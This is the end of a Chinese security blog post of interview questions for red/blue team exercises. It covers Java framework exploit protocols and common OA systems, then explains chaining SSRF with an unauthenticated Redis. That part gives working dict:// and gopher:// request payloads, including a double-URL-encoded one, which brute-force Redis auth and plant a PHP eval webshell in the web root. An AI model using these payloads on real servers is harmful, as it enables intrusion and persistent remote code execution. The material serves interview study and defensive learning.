<h4 id="Java中常见框架漏洞使用的协议"><a href="#Java中常见框架漏洞使用的协议" class="headerlink" title="Java中常见框架漏洞使用的协议"></a>Java中常见框架漏洞使用的协议</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic反序列化：T3协议和XMLDecodeer</span><br></pre></td></tr></table></figure>

<h4 id="常见的OA系统"><a href="#常见的OA系统" class="headerlink" title="常见的OA系统"></a>常见的OA系统</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP：通达OA、泛微Eoffice</span><br><span class="line">Java：泛微OA/云桥、致远OA、蓝凌OA、用友OA</span><br><span class="line">ASP：启莱OA</span><br></pre></td></tr></table></figure>

<h4 id="SSRF怎么结合Redis相关漏洞利用"><a href="#SSRF怎么结合Redis相关漏洞利用" class="headerlink" title="SSRF怎么结合Redis相关漏洞利用"></a>SSRF怎么结合Redis相关漏洞利用</h4><p>主要通过两种协议，dict协议和gopher协议。</p>
<p>dict协议利用Redis相关漏洞：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">探测端口：</span><br><span class="line">ssrf.php?url=dict://x.x.x.x:$端口$   利用burpsuite爆破端口</span><br><span class="line"></span><br><span class="line">探测是否设置弱口令：</span><br><span class="line">ssrf.php?url=dict://x.x.x.x:6379/info     已知端口利用info探测是否设置了密码</span><br><span class="line"></span><br><span class="line">爆破密码：</span><br><span class="line">ssrf.php?url=dict://x.x.x.x:6379/auth:$密码$     利用burpsuite爆破密码</span><br><span class="line"></span><br><span class="line">写入webshell：</span><br><span class="line">    1.  url=dict://xxx.xxx:6379/config:set:dir:/var/www/html   切换文件目录</span><br><span class="line">    2.  url=dict://xxx.xxx:6379/config:set:dbfilename:webshell.php   设置保存文件名</span><br><span class="line">    3. url=dict://xxx.xxx:6379/set:webshell:&quot;\x3c\x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x3f\x3e&quot;     //利用dict协议写入webshell   以上的字符编码是&lt;?php phpinfo();?&gt;的十六进制</span><br><span class="line">    4.  url=dict://x.x.x.x:6379/save   保存</span><br></pre></td></tr></table></figure>

<p>gopher协议利用redis未授权访问漏洞写入webshell：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">常规利用步骤：</span><br><span class="line"></span><br><span class="line">set x &quot;\n\n\n&lt;?php @eval($_POST[&#x27;redis&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line">config set dir /var/www/html  </span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">两次url编码后构造url：</span><br><span class="line">http://192.168.1.1/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_%25%37%33%25%36%35%25%37%34%25%32%30%25%37%38%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%34%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%32%37%25%37%32%25%36%35%25%36%34%25%36%39%25%37%33%25%32%37%25%35%64%25%32%39%25%33%62%25%33%66%25%33%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%30%25%32%30%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35</span><br><span class="line"></span><br><span class="line">//第一次url解码和第二次url解码</span><br><span class="line">//同理其他类似计划任务反弹和写入ssh公钥等getshell方式相似</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>柷澂
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://monkeyx1.github.io/2023/06/17/hvv%E5%B8%B8%E8%80%83%E9%9D%A2%E8%AF%95%E9%A2%98-%E8%93%9D%E9%98%9F/" title="hvv常考面试题-蓝队">https://monkeyx1.github.io/2023/06/17/hvv常考面试题-蓝队/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
                    
                      <a href="/" rel="tag"><i class="fa fa-tag"></i> </a>
                    
                      <a href="/" rel="tag"><i class="fa fa-tag"></i> </a>
                    
                      <a href="/" rel="tag"><i class="fa fa-tag"></i> </a>
                    
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/06/17/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="prev" title="常见webshell管理工具流量分析">
                  <i class="fa fa-chevron-left"></i> 常见webshell管理工具流量分析
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/06/19/CVE-2021-44228%E5%A4%8D%E7%8E%B0/" rel="next" title="CVE-2021-44228复现">
                  CVE-2021-44228复现 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2022 – 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">柷澂</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">181k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">2:44</span>
  </span>
</div><div>
  <span id="sitetime"></span>
  <script language=javascript>
      function siteTime(){
          window.setTimeout("siteTime()", 1000);
          var seconds = 1000;
          var minutes = seconds * 60;
          var hours = minutes * 60;
          var days = hours * 24;
          var years = days * 365;
          var today = new Date();
          var todayYear = today.getFullYear();
          var todayMonth = today.getMonth()+1;
          var todayDate = today.getDate();
          var todayHour = today.getHours();
          var todayMinute = today.getMinutes();
          var todaySecond = today.getSeconds();
          /* 
          Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
          year - 作为date对象的年份，为4位年份值
          month - 0-11之间的整数，做为date对象的月份
          day - 1-31之间的整数，做为date对象的天数
          hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
          minutes - 0-59之间的整数，做为date对象的分钟数
          seconds - 0-59之间的整数，做为date对象的秒数
          microseconds - 0-999之间的整数，做为date对象的毫秒数
      */
          var t1 = Date.UTC(2021,12,23,11,40,00); //北京时间2018-2-13 00:00:00
          var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
          var diff = t2-t1;
      var diffYears = Math.floor(diff/years);
      var diffDays = Math.floor((diff/days)-diffYears*365);
      var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
      var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
      var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
      document.getElementById("sitetime").innerHTML=" 已运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
    }
      siteTime();
  </script>
</div>

    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  

  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"ccA2VsTMA0zc7SQqWsCEBhP6-gzGzoHsz","app_key":"RzrgPNrOtq5LckltkJZDwE0z","server_url":null,"security":true}</script>
  <script src="/js/third-party/statistics/lean-analytics.js"></script>



<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
</html>
